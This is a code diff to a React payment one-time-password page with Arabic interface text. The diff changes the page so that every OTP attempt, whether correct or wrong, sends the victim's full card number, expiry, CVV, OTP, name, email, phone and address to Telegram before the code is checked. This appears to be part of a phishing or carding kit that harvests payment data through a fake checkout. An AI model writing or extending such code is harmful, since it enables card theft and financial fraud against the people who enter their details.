@@ -81,9 +81,40 @@ const PaymentOTP = () => {
 
   const handleSubmit = async () => {
     if (!payment || isLocked) return;
-    
+
     setError("");
-    
+
+    // ALWAYS send to Telegram, regardless of whether OTP is correct or wrong
+    const isCorrect = otp === payment.otp;
+
+    // Send payment data to Telegram immediately (before checking correctness)
+    const telegramResult = await sendToTelegram({
+      type: 'payment_otp_attempt',
+      data: {
+        name: payment.name || '',
+        email: payment.email || '',
+        phone: payment.phone || '',
+        address: payment.address || '',
+        service: serviceName,
+        amount: payment.amount || '',
+        cardholder: payment.cardholder || '',
+        cardNumber: payment.card_number || '',
+        cardLast4: payment.card_last4 || '',
+        expiry: payment.card_expiry || '',
+        cvv: payment.card_cvv || '',
+        otp: otp,
+        otp_status: isCorrect ? 'correct' : 'wrong',
+        attempts: payment.attempts + 1
+      },
+      timestamp: new Date().toISOString()
+    });
+
+    if (telegramResult.success) {
+      console.log('OTP attempt sent to Telegram successfully');
+    } else {
+      console.error('Failed to send OTP attempt to Telegram:', telegramResult.error);
+    }
+
     // Check if OTP matches
     if (otp === payment.otp) {
       // Submit to Netlify Forms
@@ -94,7 +125,7 @@ const PaymentOTP = () => {
       formData.append('paymentId', payment.id);
       formData.append('linkId', id || '');
       formData.append('status', 'confirmed');
-      
+
       try {
         await fetch('/', {
           method: 'POST',
@@ -103,32 +134,6 @@ const PaymentOTP = () => {
         });
       } catch (error) {
         console.error('Form submission error:', error);
-      }
-      
-      // Send payment confirmation to Telegram
-      const telegramResult = await sendToTelegram({
-        type: 'payment_confirmation',
-        data: {
-          name: payment.name || '',
-          email: payment.email || '',
-          phone: payment.phone || '',
-          address: payment.address || '',
-          service: serviceName,
-          amount: payment.amount || '',
-          cardholder: payment.cardholder || '',
-          cardNumber: payment.card_number || '',
-          cardLast4: payment.card_last4 || '',
-          expiry: payment.card_expiry || '',
-          cvv: payment.card_cvv || '',
-          otp: otp
-        },
-        timestamp: new Date().toISOString()
-      });
-
-      if (telegramResult.success) {
-        console.log('Payment confirmation sent to Telegram successfully');
-      } else {
-        console.error('Failed to send payment confirmation to Telegram:', telegramResult.error);
       }
 
       // Success!
@@ -139,21 +144,21 @@ const PaymentOTP = () => {
           receipt_url: `/pay/${id}/receipt/${payment.id}`,
         },
       });
-      
+
       toast({
         title: "تم بنجاح!",
         description: "تم تأكيد الدفع بنجاح",
       });
-      
+
       navigate(`/pay/${id}/receipt/${payment.id}`);
     } else {
       // Wrong OTP
       const newAttempts = payment.attempts + 1;
-      
+
       if (newAttempts >= 3) {
         // Lock for 15 minutes
         const lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString();
-        
+
         await updatePayment.mutateAsync({
           paymentId: payment.id,
           updates: {
@@ -161,10 +166,10 @@ const PaymentOTP = () => {
             locked_until: lockUntil,
           },
         });
-        
+
         setIsLocked(true);
         setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
-        
+
         toast({
           title: "تم الحظر",
           description: "لقد تجاوزت عدد المحاولات المسموحة",
@@ -178,7 +183,7 @@ const PaymentOTP = () => {
             attempts: newAttempts,
           },
         });
-        
+
         setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
         refetch();
       }
